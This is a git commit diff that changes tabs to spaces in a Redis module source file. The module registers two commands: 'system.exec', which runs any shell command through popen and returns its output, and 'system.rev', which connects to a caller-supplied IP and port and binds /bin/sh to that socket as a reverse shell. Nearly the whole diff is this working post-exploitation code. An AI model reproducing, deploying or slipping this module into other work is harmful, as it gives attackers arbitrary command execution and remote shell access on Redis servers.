8155be4d310d0cd8f227365eb9e6bf91b838d4af
firebroo <lg224@foxmail.com>
2019-07-12 10:51:27 +0800

    tab => space

--- RedisModulesSDK/module/module.cpp
+++ RedisModulesSDK/module/module.cpp
@@ -25,28 +25,28 @@ extern int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int
 int 
 DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
 {
-	if (argc != 2) {
+    if (argc != 2) {
         return RedisModule_WrongArity(ctx);
-	} 
+    } 
 
-	size_t cmd_len;
-	size_t size = 1024;
-	const char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
+    size_t cmd_len;
+    size_t size = 1024;
+    const char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
 
-	FILE *fp = popen(cmd, "r");
-	char *buf, *output;
-	buf = (char *)malloc(size);
-	output = (char *)malloc(size);
-	while ( fgets(buf, sizeof(buf), fp) != 0 ) {
-		if (strlen(buf) + strlen(output) >= size) {
-			output = (char*)realloc(output, size<<2);
-			size <<= 1;
-		}
-		strcat(output, buf);
-	}
-	RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
-	RedisModule_ReplyWithString(ctx, ret);
-	pclose(fp);
+    FILE *fp = popen(cmd, "r");
+    char *buf, *output;
+    buf = (char *)malloc(size);
+    output = (char *)malloc(size);
+    while ( fgets(buf, sizeof(buf), fp) != 0 ) {
+        if (strlen(buf) + strlen(output) >= size) {
+            output = (char*)realloc(output, size<<2);
+            size <<= 1;
+        }
+        strcat(output, buf);
+    }
+    RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
+    RedisModule_ReplyWithString(ctx, ret);
+    pclose(fp);
 
     return REDISMODULE_OK;
 }
@@ -55,9 +55,9 @@ DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
 int
 RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
 {
-	if (argc != 3) {
+    if (argc != 3) {
         return RedisModule_WrongArity(ctx);
-	}
+    }
 
     int pid;
     pid = fork();
@@ -74,24 +74,24 @@ RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
     if (!ret) {
         return REDISMODULE_OK;
     }
-	size_t cmd_len;
-	const char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
-	const char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
-	int port = atoi(port_s);
-	int s;
+    size_t cmd_len;
+    const char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
+    const char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
+    int port = atoi(port_s);
+    int s;
 
-	struct sockaddr_in sa;
-	sa.sin_family = AF_INET;
-	sa.sin_addr.s_addr = inet_addr(ip);
-	sa.sin_port = htons(port);
-	
-	s = socket(AF_INET, SOCK_STREAM, 0);
-	connect(s, (struct sockaddr *)&sa, sizeof(sa));
-	dup2(s, 0);
-	dup2(s, 1);
-	dup2(s, 2);
+    struct sockaddr_in sa;
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr(ip);
+    sa.sin_port = htons(port);
+    
+    s = socket(AF_INET, SOCK_STREAM, 0);
+    connect(s, (struct sockaddr *)&sa, sizeof(sa));
+    dup2(s, 0);
+    dup2(s, 1);
+    dup2(s, 2);
 
-	execve("/bin/sh", 0, 0);
+    execve("/bin/sh", 0, 0);
 
     return REDISMODULE_OK;
 }
@@ -105,7 +105,7 @@ RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
     if (RedisModule_CreateCommand(ctx, "system.exec",
         DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
         return REDISMODULE_ERR;
-	if (RedisModule_CreateCommand(ctx, "system.rev",
+    if (RedisModule_CreateCommand(ctx, "system.rev",
         RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
         return REDISMODULE_ERR;
     return REDISMODULE_OK;
